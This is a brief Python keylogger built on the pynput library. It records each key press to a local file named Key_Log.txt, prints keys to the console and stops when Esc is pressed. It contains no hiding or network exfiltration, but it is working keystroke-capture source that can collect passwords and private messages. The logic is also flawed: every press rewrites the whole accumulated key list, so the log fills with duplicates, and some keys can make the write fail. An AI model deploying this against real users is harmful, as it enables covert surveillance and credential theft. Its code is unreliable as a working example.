from pynput.keyboard import Key, Listener

pressed_keys = []

def on_press(key):
    pressed_keys.append(key)
    write_to_file(pressed_keys)
    print(key)

def write_to_file(keys):
    with open("Key_Log.txt", "a") as f:
        for key in keys:
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key)
            f.write(key_str + "\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
